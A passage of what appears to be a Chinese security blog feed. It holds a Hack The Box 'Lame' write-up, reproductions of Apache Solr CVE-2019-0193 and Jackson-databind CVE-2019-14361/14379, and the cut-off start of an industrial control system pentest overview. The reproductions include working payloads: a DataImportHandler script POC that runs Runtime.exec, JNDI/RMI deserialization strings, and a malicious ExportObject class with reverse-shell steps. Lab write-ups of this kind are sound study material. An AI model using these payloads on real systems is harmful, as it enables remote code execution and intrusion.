'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Lame</title>
      <link href="/2019/08/10/hackthebox-lame/"/>
      <url>/2019/08/10/hackthebox-lame/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Lame"><a href="#Hack-The-Box-——-Lame" class="headerlink" title="Hack The Box —— Lame"></a>Hack The Box —— Lame</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190810200126.png-water_print" alt=""></p><h2 id="信息搜集与漏洞利用"><a href="#信息搜集与漏洞利用" class="headerlink" title="信息搜集与漏洞利用"></a>信息搜集与漏洞利用</h2><p>先上 <code>nmap</code> 扫描一波：</p><pre class=" language-bash"><code class="language-bash">nmap -T4 -A -v 10.10.10.3</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190810200151.png-water_print" alt=""></p><p>发现开了四个端口。</p><p>搜索 <code>vsftpd</code> 相关漏洞，发现2.3.4版本自带后门，在 <code>metasploit</code> 上搜索，发现该漏洞无法利用。</p><p>转而寻找 <code>samba 3.0.20</code> 版本漏洞，在 <code>msf</code> 上发现了一个 <code>excellent</code> 级别的漏洞，填上 IP ，<code>exploit</code> 执行：<br>反弹到 shell。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190810200210.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190810200215.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190810200220.png-water_print" alt=""></p><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><h3 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> /home/makis/user.txt</code></pre><h3 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> /root/root.txt</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr 远程命令执行漏洞:CVE-2019-0193</title>
      <link href="/2019/08/07/apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/08/07/apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Solr-远程命令执行漏洞"><a href="#Apache-Solr-远程命令执行漏洞" class="headerlink" title="Apache Solr 远程命令执行漏洞"></a>Apache Solr 远程命令执行漏洞</h1><p>2019年8月1日，Apache Solr官方发布了 CVE-2019-0193 漏洞预警，漏洞危害评级为严重。</p><p>此次漏洞出现在 Apache Solr 的 DataImportHandler ，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p><p>360CERT 判断漏洞等级为高，建议 Apache Solr 用户及时升级以防止攻击者攻击。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class=" language-XML"><code class="language-XML"><dataConfig>    <script><![CDATA[                function f1(row){                    var run = java.lang.Runtime.getRuntime().exec("touch /tmp/success");                    row.put('name', 'Hello World!');                    return row;                }    ]]></script>    <document>        <entity name="person" transformer="script:f1" query="select * from person" pk="id">            <field column="id" name="id" />            <field column="name" name="name" />        </entity>    </document></dataConfig></code></pre><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>该漏洞的产生是由于两方面的原因：</p><ul><li>用户在<code>solrconfig.xml</code>文件中设置了<code>DataImportHandler</code>，开启了<code>DataImport</code>功能。</li><li><code>DataImportHandler</code>模块允许用户自己包含脚本，来进行配置。</li></ul><p>攻击者可以通过构造恶意的脚本交由转换器进行解析，在Solr解析的过程中并未对用户的输入做检查，可导致攻击者远程在Solr服务器上执行命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="solr部署"><a href="#solr部署" class="headerlink" title="solr部署"></a>solr部署</h3><p>本环境采用docker部署<br>拉取镜像：docker pull solr: 8.1.1<br>启动容器：docker run –name solr -d -p 8983:8983 -t solr:8.1.1<br>访问<code>http://IP:8983/</code>，apache solr 框架部署完毕<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print" alt=""></p><h3 id="开启DataImportHandler插件"><a href="#开启DataImportHandler插件" class="headerlink" title="开启DataImportHandler插件"></a>开启DataImportHandler插件</h3><h4 id="新建core："><a href="#新建core：" class="headerlink" title="新建core："></a>新建core：</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print" alt=""><br>点击Add Core，solr系统报错。</p><p>然后执行：docker exec -it –user root solr /bin/bash，进入solr容器。</p><p>进入容器后，执行：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cp</span> /opt/solr-8.1.1/server/solr/configsets/_default/conf  /var/solr/data/new_core/<span class="token function">cp</span> /opt/solr/dist/solr-dataimporthandler-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib<span class="token function">cp</span> /opt/solr/dist/solr-dataimporthandler-extras-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib<span class="token function">cd</span> /var/solr/data/new_core/conf/vim solrconfig.xml</code></pre><h3 id="DataImportHandler-插件配置"><a href="#DataImportHandler-插件配置" class="headerlink" title="DataImportHandler 插件配置"></a>DataImportHandler 插件配置</h3><p>将下面的XML添加到<code>solrconfig.xml</code>中</p><pre class=" language-XML"><code class="language-XML"><requestHandler name="/dataimport"                  class="org.apache.solr.handler.dataimport.DataImportHandler" >     <lst name="defaults">       <str name="config">data-config.xml</str>     </lst> </requestHandler></code></pre><p><code>注</code>：XML的格式一定按照上述格式，否则会报错！</p><p>执行<code>vim data-config.xml</code>，并将下面XML保存至该文件：</p><pre class=" language-XML"><code class="language-XML"><dataConfig>    <dataSource driver="com.mysql.jdbc.Driver" url="jdbc:mysql://IP:3306/securityTest" user="root" password="root" />    <document>        <entity name="person" query="select * from person" pk="id">            <field column="id" name="id" />            <field column="name" name="name" />        </entity>    </document></dataConfig></code></pre><p>然后将 <code>mysql-connector-java-5.1.48.jar</code> 放入 <code>/opt/solr/server/solr-webapp/webapp/WEB-INF/lib</code> 文件夹下</p><h3 id="重启solr"><a href="#重启solr" class="headerlink" title="重启solr"></a>重启solr</h3><p>然后重启solr：<code>./opt/solr/bin/solr restart</code></p><p>至此，漏洞环境搭建完毕，搭建成功的截图如下：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print" alt=""></p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="访问管理页面"><a href="#访问管理页面" class="headerlink" title="访问管理页面"></a>访问管理页面</h3><p>浏览器访问：<code>http://IP:8983/</code></p><h3 id="开启Debug模式"><a href="#开启Debug模式" class="headerlink" title="开启Debug模式"></a>开启Debug模式</h3><p>将poc复制到Configuration中：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print" alt=""></p><p>可在标注的地方更换受害机执行的命令，本文以反弹<code>shell</code>为例。</p><h3 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h3><p><code>nc -lp 4567</code></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>点击 <code>Execute with this Configuration</code><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print" alt=""></p><p>执行成功可以发现shell已经成功反弹：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print" alt=""></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Apache Solr &lt; 8.2.0</li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>将Apache Solr升级至8.2.0或之后的版本</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14361 &amp; CVE-2019-14379漏洞复现</title>
      <link href="/2019/08/01/cve-2019-14361-cve-2019-14379-lou-dong-fu-xian/"/>
      <url>/2019/08/01/cve-2019-14361-cve-2019-14379-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-14361-amp-CVE-2019-14379漏洞复现"><a href="#CVE-2019-14361-amp-CVE-2019-14379漏洞复现" class="headerlink" title="CVE-2019-14361 &amp; CVE-2019-14379漏洞复现"></a>CVE-2019-14361 &amp; CVE-2019-14379漏洞复现</h1><p>7月30日晚收到了推送，得知 Jackson-databind 又出了新的 RCE ，又有大佬找到了新的利用方式。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据 Jackson 开发者的 issue ，触发这个 Jackson 漏洞需要满足如下要求，</p><p>目标应用接收到不可信客户端发送的 JSON 数据<br>目标应用使用多态类型处理方式来处理java.lang.Object类型的属性；<br>在该漏洞中就是依赖的第三方jar包有点多(感觉在实际利用过程中能遇到这些个库也挺巧的)</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本文中用到的第三方库有：<br>jackson-annotations-2.9.8<br>jackson-core-2.9.8<br>jackson-databind-2.9.8<br>ehcache-2.9.1<br>slf4j-api-1.7.7<br>logback-core-1.3.0-alpha4<br>slf4j-simple-1.7.21<br>javax.transaction_1.0.0.0_1-1</p><p>在 <a href="http://www.mvnrepository.com" target="_blank" rel="noopener">http://www.mvnrepository.com</a> 上下载即可。</p><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>SerializationFeature<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Exception<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mapping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 注意，在高版本的JDK上存在限制，需要将com.sun.jndi.rmi.object.trustURLCodebase的值设置为true，默认为false</span>        System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// CVE-2019-14361 payload</span>        String jsonStr1 <span class="token operator">=</span> <span class="token string">"[\"ch.qos.logback.core.db.JNDIConnectionSource\", {\"jndiLocation\":\"rmi://127.0.0.1:1099/ExportObject\"}]"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// CVE-2019-14379 payload</span>        String jsonStr2 <span class="token operator">=</span> <span class="token string">"[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\",{\"properties\":{\"jndiName\":\"rmi://127.0.0.1:1099/ExportObject\"}}]"</span><span class="token punctuation">;</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>SerializationFeature<span class="token punctuation">.</span>FAIL_ON_EMPTY_BEANS<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serializing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// !->此处更换payload&lt;-!</span>            obj <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>jsonStr1<span class="token punctuation">,</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"objectified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stringified: "</span> <span class="token operator">+</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="构建步骤"><a href="#构建步骤" class="headerlink" title="构建步骤"></a>构建步骤</h2><p>本文在 IDEA 上生成项目</p><ol><li>新建 java Commandline 项目</li><li>将上述代码复制进 <code>Main</code> 函数</li><li>单击红框中的图标，进入项目结构设置<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print" alt=""></li><li>将下载好的外部库导入到项目中<br>具体导入步骤可以参考我的这篇文章，再此不做赘述 <a href="https://www.secquan.org/BugWarning/1069944" target="_blank" rel="noopener">https://www.secquan.org/BugWarning/1069944</a></li></ol><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>开启 RMI 服务<br>为了方便，我们可以使用marshalsec这款神器，可以快速开启RMI和LDAP服务。当然你需要下载源码包，使用maven编译。下载链接：<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a>，下载到本地后，利用 <code>mvn clean package -DskipTests</code> 即可编译，编译的结果如下：</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190801153230.png-water_print" alt=""></p><p>开启RMI服务：</p><pre class=" language-bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8000/<span class="token comment" spellcheck="true">#ExportObject</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190801154544.png-water_print" alt="成功开启后的截图"></p><p><code>注：</code>：# 后面填写你的恶意类的类名，它会自动绑定 URI，rmi 默认端口号为 1099 。</p><ol start="2"><li>编译ExportObject.java</li></ol><p>ExportObject.java代码内容如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>by<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExportObject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ExportObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Process proc <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open /Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BufferedReader br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuffer sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String line<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String result <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Exception e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ExportObject e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExportObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>注</code>：上述代码的功能为在 mac 平台上弹出计算器，如更换平台，请自行更换 exec 函数中的内容。</p><p>编译成class文件：<br><code>javac ExportObject.java</code></p><ol start="3"><li>在生成 ExportObject.class 文件夹下执行 python2 -m SimpleHTTPServer 8000，在本地启动 HTTP 服务。</li></ol><h2 id="CVE-2019-14361-测试"><a href="#CVE-2019-14361-测试" class="headerlink" title="CVE-2019-14361 测试"></a>CVE-2019-14361 测试</h2><p>将 POC 中的 payload 更换为 jsonStr1，并编译运行，结果如下：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190801154407.png-water_print" alt=""></p><h2 id="CVE-2019-14379-测试"><a href="#CVE-2019-14379-测试" class="headerlink" title="CVE-2019-14379 测试"></a>CVE-2019-14379 测试</h2><p>将 POC 中的 payload 更换为 jsonStr2，并编译运行，结果如下：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190801154458.png-water_print" alt=""></p><p>相应的，rmi 服务运行的截图如下：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190801154946.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工控安全渗透</title>
      <link href="/2019/07/28/gong-kong-an-quan-shen-tou-ce-shi/"/>
      <url>/2019/07/28/gong-kong-an-quan-shen-tou-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="工控安全渗透"><a href="#工控安全渗透" class="headerlink" title="工控安全渗透"></a>工控安全渗透</h1><h2 id="工业控制系统的结构和场景"><a href="#工业控制系统的结构和场景" class="headerlink" title="工业控制系统的结构和场景"></a>工业控制系统的结构和场景</h2><h3 id="工业控制系统场景——啤酒厂"><a href="#工业控制系统场景——啤酒厂" class="headerlink" title="工业控制系统场景——啤酒厂"></a>工业控制系统场景——啤酒厂</h3><ul><li>啤酒工厂布局</li><li>监控总控室</li><li>生产线设备</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093119.png-water_print" alt="概况"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093135.png-water_print" alt="主控室"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093148.png-water_print" alt="现场设备"></p><h3 id="工业控制系统结构"><a href="#工业控制系统结构" class="headerlink" title="工业控制系统结构"></a>工业控制系统结构</h3><ul><li>传感器和执行器</li><li>可编程控制器(PLC)</li><li>工业网络及现场总线</li><li>工业计算机及工业组态软件</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093158.png-water_print" alt="结构"></p><h3 id="工业控制系统应用场景"><a href="#工业控制系统应用场景" class="headerlink" title="工业控制系统应用场景"></a>工业控制系统应用场景</h3><ul><li>过程自动化控制系统<ul><li>应用在流程行业，比如：石油，化工，医药。冶金，水处理</li><li>对应的控制系统：DCS(集散控制系统)居多，大型PLC为主，单台控制器IO<code>点数</code>(传感器与执行器的数量)多数在<code>2000点以上</code>，全冗余架构</li></ul></li><li>工厂自动化控制系统<ul><li>应用在离散行业，比如：汽车，港口，烟草</li><li>对应控制系统：主要以PLC为主，采用和设备捆绑为主，单台控制IO点数<code>少于2000点</code>，单机为主</li></ul></li></ul><h2 id="工业控制系统厂商和产品介绍"><a href="#工业控制系统厂商和产品介绍" class="headerlink" title="工业控制系统厂商和产品介绍"></a>工业控制系统厂商和产品介绍</h2><h3 id="Siemens——控制系统家族"><a href="#Siemens——控制系统家族" class="headerlink" title="Siemens——控制系统家族"></a>Siemens——控制系统家族</h3><ul><li>s7-1500控制系统</li><li>S7-1200控制系统</li><li>S7-300/400控制系统</li><li>S7-WINAC控制系统(PC模拟PLC，多用于高校研究)</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093215.png-water_print" alt=""></p><h3 id="Siemens——组态家族"><a href="#Siemens——组态家族" class="headerlink" title="Siemens——组态家族"></a>Siemens——组态家族</h3><ul><li>TIA博图/Step7(编程)</li><li>WINCC组态监控软件(监控)</li><li>PLCSIM模拟仿真软件(前期模拟仿真)</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093240.png-water_print" alt="TIA博图"><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093253.png-water_print" alt="WINCC组态监控软件"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093308.png-water_print" alt="PLCSIM"></p><h3 id="Siemens——通讯协议及端口"><a href="#Siemens——通讯协议及端口" class="headerlink" title="Siemens——通讯协议及端口"></a>Siemens——通讯协议及端口</h3><ul><li>S7 Comm协议(私有协议)</li><li>通讯端口(102)</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093331.png-water_print" alt=""></p><h3 id="Rockwell-Automation——控制系统家族"><a href="#Rockwell-Automation——控制系统家族" class="headerlink" title="Rockwell Automation——控制系统家族"></a>Rockwell Automation——控制系统家族</h3><ul><li>Controllogix控制系统</li><li>Compactlogix控制系统</li><li>MicroLogix控制系统</li><li>Softlogix控制系统</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093344.png-water_print" alt=""></p><h3 id="Rockwell-Automation——组态家族"><a href="#Rockwell-Automation——组态家族" class="headerlink" title="Rockwell Automation——组态家族"></a>Rockwell Automation——组态家族</h3><ul><li>Studio5000/RSLogix 5000组态软件</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093355.png-water_print" alt="RSLogix"></p><ul><li>FactoryTalk SE组态监控软件</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093407.png-water_print" alt=""></p><ul><li>Emulation模拟仿真软件</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093416.png-water_print" alt=""></p><h3 id="Rockwell-Automation——通讯协议及端口"><a href="#Rockwell-Automation——通讯协议及端口" class="headerlink" title="Rockwell Automation——通讯协议及端口"></a>Rockwell Automation——通讯协议及端口</h3><ul><li>Ethernet/IP(公开协议)</li><li>通讯端口 44818/2222</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093426.png-water_print" alt=""></p><h2 id="工业控制系统脆弱性分析"><a href="#工业控制系统脆弱性分析" class="headerlink" title="工业控制系统脆弱性分析"></a>工业控制系统脆弱性分析</h2><h3 id="工业控制协议漏洞"><a href="#工业控制协议漏洞" class="headerlink" title="工业控制协议漏洞"></a>工业控制协议漏洞</h3><ul><li>所使用的工业控制协议缺乏身份认证</li><li>工业控制系统所使用的协议缺乏授权机制</li><li>所使用的工业控制协议缺乏加密保护</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093438.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093448.png-water_print" alt="S7-300请求通信数据包"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093505.png-water_print" alt="确认ACK"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093515.png-water_print" alt="数据通信"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093525.png-water_print" alt="确认"></p><h3 id="PLC代码逻辑漏洞"><a href="#PLC代码逻辑漏洞" class="headerlink" title="PLC代码逻辑漏洞"></a>PLC代码逻辑漏洞</h3><ul><li>计算逻辑漏洞</li><li>看门口超时漏洞</li><li>缓冲区溢出漏洞</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093541.png-water_print" alt=""></p><h3 id="工业以太网链路漏洞"><a href="#工业以太网链路漏洞" class="headerlink" 